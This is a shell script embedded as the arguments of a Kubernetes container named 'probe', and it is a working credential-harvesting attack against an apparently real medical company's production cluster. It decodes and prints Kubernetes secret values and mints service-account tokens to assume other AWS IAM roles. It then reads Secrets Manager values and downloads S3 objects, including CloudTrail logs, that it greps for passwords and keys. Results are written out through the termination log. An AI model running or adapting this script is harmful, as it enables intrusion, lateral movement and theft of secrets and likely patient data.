containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
SUM=/tmp/summary.txt
: > $SUM
echo "===I3390S_START env=prod utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
echo "EGRESS $(wget -q -O - --timeout=20 'http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,isp,org,query' 2>/dev/null | head -c 320)"

# ---------- PHASE EXT: ExternalSecrets / SecretStores (metadata only) ----------
echo "###PHASE_EXT"
: > /tmp/ext.txt
NSJ=$(get "$API/api/v1/namespaces")
NSL=$(echo "$NSJ" | jq -r '.items[]?.metadata.name' 2>/dev/null)
echo "NS_LIST $(echo $NSL | tr '\n' ' ')"
for NS in $NSL; do
  for V in v1beta1 v1; do
    R=$(get "$API/apis/external-secrets.io/$V/namespaces/$NS/externalsecrets")
    N=$(echo "$R" | jq -r '.items|length' 2>/dev/null)
    if [ "${N:-0}" != "0" ] && [ "${N:-0}" != "null" ]; then
      echo "$R" | jq -r --arg ns "$NS" '.items[]? | "EXTITEM \($ns)/\(.metadata.name) target=\(.spec.target.name // "") keys=" + ([.spec.data[]? | ((.remoteRef.key // "") + (if .remoteRef.property then "#"+.remoteRef.property else "" end))] | join("|"))' >> /tmp/ext.txt 2>/dev/null
      break
    fi
  done
done
echo "EXT_TOTAL=$(wc -l < /tmp/ext.txt)"
head -c 9000 /tmp/ext.txt; echo
for RES in clustersecretstores secretstores; do
  for V in v1beta1 v1; do
    R=$(get "$API/apis/external-secrets.io/$V/$RES")
    N=$(echo "$R" | jq -r '.items|length' 2>/dev/null)
    if [ "${N:-0}" != "0" ] && [ "${N:-0}" != "null" ]; then
      echo "STORE_$RES n=$N"
      echo "$R" | jq -c '.items[]? | {n:.metadata.name,k:.kind,p:.spec.provider}' 2>/dev/null | head -c 3000; echo
      break
    fi
  done
done

# ---------- PHASE SECV: read k8s Secret values for app namespaces (bounded) ----------
echo "###PHASE_SECV"
CNT=0
for NS in $NSL; do
  case "$NS" in kube-system|kube-public|kube-node-lease|argocd|default) continue;; esac
  SJ=$(get "$API/api/v1/namespaces/$NS/secrets")
  [ -z "$SJ" ] && continue
  NAMES=$(echo "$SJ" | jq -r '.items[]?.metadata.name' 2>/dev/null | grep -Ei 'db|secret|jwt|key|token|oauth|smtp|stripe|openai|llm|ses|payment|cred|redis|postgres|mysql|api|password' | grep -Eiv 'default-token|ca\.crt|tls|dockercfg|helm' | head -20)
  [ -z "$NAMES" ] && continue
  echo "SECNS $NS $(echo "$SJ" | jq -r '.items|length' 2>/dev/null)"
  for nm in $NAMES; do
    [ $CNT -ge 60 ] && break
    echo "SEK $NS/$nm"
    echo "$SJ" | jq -r --arg n "$nm" '.items[]|select(.metadata.name==$n)|.data|to_entries[]?|"\(.key)\t\(.value)"' 2>/dev/null | head -10 | while IFS='	' read -r K V; do
      DV=$(printf '%s' "$V" | base64 -d 2>/dev/null | head -c 400 | tr '\n' ' ')
      echo "  DK $K=$DV"
    done
    CNT=$((CNT+1))
  done
done
echo "SECV_TOTAL=$CNT"

# ---------- PHASE ASSUME ----------
echo "###PHASE_ASSUME"
ALL=$(get "$API/api/v1/serviceaccounts")
echo "$ALL" | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] != null) | "\(.metadata.namespace) \(.metadata.name)"' > /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas.txt)"
cat /tmp/sas.txt
assume(){
  NS=$1; S=$2; SESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && { echo "ROLE_NONE $NS/$S"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$S"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "$SESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$S $(echo "$RES"|head -c 160|tr '\n' ' ')"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  CUR="$NS/$S"; echo "ASSUME_OK $NS/$S role=$AR"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CUR=""; }
use(){ i=$1
  export AWS_ACCESS_KEY_ID=$(cat /tmp/ak$i 2>/dev/null)
  export AWS_SECRET_ACCESS_KEY=$(cat /tmp/sk$i 2>/dev/null)
  export AWS_SESSION_TOKEN=$(cat /tmp/st$i 2>/dev/null)
}
who(){ cat /tmp/who$1 2>/dev/null; }
i=0
ORDER="data-management/data-management-sa imfusion-service/imfusion-service-sa s3-ingestion/s3-ingestion-sa de-identifier-service/de-identifier-service-sa metadata-extraction-service/metadata-extraction-service-sa user-management-service/user-management-sa authorization-service/authorization-service-sa notification-service/notification-service-sa cognito-service/cognito-service-sa audit-log/audit-log-sa kube-system/ebs-csi-controller-sa kube-system/cluster-autoscaler kube-system/aws-load-balancer-controller"
printf '%s\n' $ORDER > /tmp/saorder.txt
while read -r NS S; do printf '%s %s\n' "$NS" "$S"; done < /tmp/sas.txt > /tmp/saall.txt
for pair in $ORDER; do
  NS=${pair%%/*}; S=${pair##*/}
  if grep -qx "$NS $S" /tmp/saall.txt; then
    i=$((i+1))
    if assume "$NS" "$S" "b$i"; then
      echo "IDENT $NS/$S $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | head -c 200)"
      echo "$AWS_ACCESS_KEY_ID" > /tmp/ak$i; echo "$AWS_SECRET_ACCESS_KEY" > /tmp/sk$i; echo "$AWS_SESSION_TOKEN" > /tmp/st$i; echo "$NS $S" > /tmp/who$i
      unassume
    fi
  fi
done
while read -r NS S; do
  grep -q "^$NS $S$" /tmp/who*.txt 2>/dev/null && continue
  i=$((i+1))
  if assume "$NS" "$S" "c$i"; then
    echo "IDENT $NS/$S $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ' | head -c 200)"
    echo "$AWS_ACCESS_KEY_ID" > /tmp/ak$i; echo "$AWS_SECRET_ACCESS_KEY" > /tmp/sk$i; echo "$AWS_SESSION_TOKEN" > /tmp/st$i; echo "$NS $S" > /tmp/who$i
    unassume
  fi
done < /tmp/saall.txt
NROLE=$(ls /tmp/who*.txt 2>/dev/null | wc -l)
echo "ROLES_CACHED=$NROLE"

# ---------- PHASE SM: ListSecrets per role (1x) + GetSecretValue on real names ----------
echo "###PHASE_SM"
: > /tmp/smcand.txt
awk -F'keys=' '{print $2}' /tmp/ext.txt 2>/dev/null | tr '|' '\n' | sed 's/#.*//' | grep -vE '^$' | sort -u > /tmp/extkeys.txt
grep -Ei '(dp|postgresql|db|rds|backup)' /tmp/extkeys.txt > /tmp/smcand.txt 2>/dev/null || true
for X in lazamedical-dp-prod-usw2-postgresql-db-secret lazamedical-dp-prod-usw2-postgresql-db1-secret lazamedical-prod-usw2-mysql-1-db-secret lazamedical-prod-usw2-db-secret; do :; done
cat >> /tmp/smcand.txt <<EOF2
lazamedical-dp-prod-usw2-postgresql-db-secret
lazamedical-dp-prod-usw2-postgresql-db1-secret
lazamedical-prod-usw2-mysql-1-db-secret
EOF2
sort -u /tmp/smcand.txt -o /tmp/smcand.txt
echo "SMCAND_N=$(wc -l < /tmp/smcand.txt)"
head -c 3000 /tmp/smcand.txt; echo
for i in $(seq 1 $NROLE); do
  use $i
  LS=$(aws secretsmanager list-secrets --max-results 100 --region us-west-2 --output json 2>&1); RC=$?
  if [ $RC -eq 0 ]; then
    echo "LS_OK role=$(who $i) n=$(echo "$LS"|jq -r '.SecretList|length')"
    echo "$LS" | jq -r '.SecretList[]? | "LSITEM \(.Name) \(.ARN)"' | head -50
    echo "$LS" | jq -r '.SecretList[]? | .Name' > /tmp/lsnames.txt
  else
    echo "LS_NO role=$(who $i) $(echo "$LS"|head -c 110|tr '\n' ' ')"
  fi
  unassume
done
[ -s /tmp/lsnames.txt ] && { grep -Ei '(dp|postgresql|db|rds|backup)' /tmp/lsnames.txt >> /tmp/smcand.txt; sort -u /tmp/smcand.txt -o /tmp/smcand.txt; }
WC=$(wc -l < /tmp/smcand.txt)
[ $WC -gt 40 ] && head -40 /tmp/smcand.txt > /tmp/smcand2.txt && mv /tmp/smcand2.txt /tmp/smcand.txt
OKS=0; ATT=0
while IFS= read -r SEC; do
  [ -z "$SEC" ] && continue
  [ $OKS -ge 25 ] && break
  for i in $(seq 1 $NROLE); do
    [ $ATT -ge 260 ] && break
    ATT=$((ATT+1))
    use $i
    V=$(aws secretsmanager get-secret-value --secret-id "$SEC" --query SecretString --output text --region us-west-2 2>/tmp/smerr.txt); RC=$?
    unassume
    if [ $RC -eq 0 ]; then
      echo "SMVAL_OK secret=$SEC role=$(who $i) len=${#V}"
      echo "$V" | head -c 3500; echo
      echo "SMVAL_OK $SEC $(who $i) len=${#V}" >> $SUM
      OKS=$((OKS+1)); break
    fi
  done
done < /tmp/smcand.txt
echo "SM_OK_TOTAL=$OKS SM_ATT=$ATT"
echo "SM_OK_TOTAL=$OKS SM_ATT=$ATT" >> $SUM

# ---------- PHASE S3: remaining buckets ----------
echo "###PHASE_S3"
: > /tmp/allkeys.txt; : > /tmp/brolemap.txt
BOK=0; BNO=0
for B in lazamedical-dp-prod01-usw2-ingestion-failure-bucket lazamedical-dp-prod01-usw2-lambda-code-s3-bucket lazamedical-dp-prod01-usw2-lps-bucket lazamedical-dp-prod01-usw2-metadata-parquet-bucket lazamedical-dp-prod01-usw2-mlflow-artifact-storage lazamedical-dp-prod01-usw2-png-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-red-bucket lazamedical-dp-prod01-usw2-rekognition-s3-bucket lazamedical-dp-prod01-usw2-temp-dicom-csv-reports-storage lazamedical-dp-prod01-usw2-temp-dicom-frame-storage lazamedical-dp-prod01-usw2-temp-storage-bucket-name lazamedical-dp-prod01-usw2-yellow-bucket lazamedical-prod01-usw2-bastion-bucket lazamedical-prod01-usw2-cloudtrail-01-logs lazamedical-prod01-usw2-cloudtrail-02-logs lazamedical-prod01-usw2-dp-ingestion-bucket lazamedical-prod01-usw2-s3-bucket lazamedical-prod01-usw2-user-management-ui-bucket lazamedical-prod01-usw2-log-bucket; do
  listed=0
  for i in $(seq 1 $NROLE); do
    use $i
    LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt); RC=$?
    unassume
    if [ $RC -eq 0 ]; then
      NN=$(echo "$LO"|jq '.Contents|length' 2>/dev/null); TR=$(echo "$LO"|jq -r '.IsTruncated' 2>/dev/null)
      echo "BKT_OK $B n=$NN trunc=$TR role=$(who $i)"
      echo "$LO" | jq -r --arg b "$B" '.Contents[]? | "\($b)\t\(.Size)\t\(.Key)"' >> /tmp/allkeys.txt
      echo "$B $i" >> /tmp/brolemap.txt
      listed=1; BOK=$((BOK+1)); break
    fi
  done
  if [ $listed -eq 0 ]; then
    echo "BKT_NO $B all_roles_denied $(head -c 110 /tmp/loerr.txt|tr '\n' ' ')"
    BNO=$((BNO+1))
  fi
done
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO BKT_KEYS_TOTAL=$(wc -l < /tmp/allkeys.txt)"
echo "BKT_OK_TOTAL=$BOK BKT_NO_TOTAL=$BNO" >> $SUM
# show interesting key names
grep -Ei 'config|secret|credential|\.env|backup|key|tfstate|\.pem|\.sql|\.ya?ml|\.json|password' /tmp/allkeys.txt | awk -F'\t' '{print "KEYNAME "$1" "$2" "$3}' | head -c 8000; echo
awk -F'\t' '{
  k=tolower($3); p=9;
  if (k ~ /(^|\/)(\.env|config|secret|credential|backup)/ || k ~ /\.(env|pem|sql|tfstate)$/) p=1;
  else if (k ~ /\.(json|ya?ml|ini|conf|properties|xml|txt)$/) p=2;
  if (p<9 && $2<1048576) print p"\t"$0
}' /tmp/allkeys.txt | sort -t'	' -k1,1n -k3,3n | cut -f2- > /tmp/cand.txt
echo "CAND_N=$(wc -l < /tmp/cand.txt)"
awk -F'\t' '{c[$1]++; if(c[$1]<=3 && n<30){print; n++}}' /tmp/cand.txt > /tmp/picked.txt
echo "PICKED_N=$(wc -l < /tmp/picked.txt)"
IDX=0; TOT=0
while IFS='	' read -r B SZ KEY; do
  [ -z "${B:-}" ] && continue
  IDX=$((IDX+1)); TOT=$((TOT+SZ))
  [ $TOT -gt 20971520 ] && { echo "CAP_BYTES"; break; }
  RI=$(awk -v b="$B" '$1==b{print $2; exit}' /tmp/brolemap.txt)
  echo "PICK $IDX bucket=$B size=$SZ key=$KEY"
  use ${RI:-1}
  aws s3api get-object --bucket "$B" --key "$KEY" /tmp/o$IDX.bin --region us-west-2 >/dev/null 2>/tmp/gerr.txt
  GRC=$?
  unassume
  echo "GET rc=$GRC bytes=$(wc -c < /tmp/o$IDX.bin 2>/dev/null || echo 0)"
  if [ $GRC -eq 0 ]; then
    if gzip -t /tmp/o$IDX.bin 2>/dev/null; then gzip -dc /tmp/o$IDX.bin > /tmp/o$IDX.txt 2>/dev/null; else cp /tmp/o$IDX.bin /tmp/o$IDX.txt; fi
    echo "SAMPLE $(head -c 160 /tmp/o$IDX.txt | tr '\n' ' ')"
    H=$(grep -aEic "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null)
    echo "HITS=$H"
    grep -aEi "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|mysql://|postgres://|redis://|jdbc:" /tmp/o$IDX.txt 2>/dev/null | head -6 | cut -c1-300
    [ "$H" != "0" ] && echo "HITFILE $B/$KEY" >> $SUM
  else
    echo "GET_ERR $(head -c 120 /tmp/gerr.txt|tr '\n' ' ')"
  fi
done < /tmp/picked.txt

echo "===I3390S_DONE $(date -u +%FT%TZ)==="
{ echo "I3390S env=prod done=$(date -u +%FT%TZ)"; cat $SUM; } 2>/dev/null | head -c 3900 > /dev/termination-log
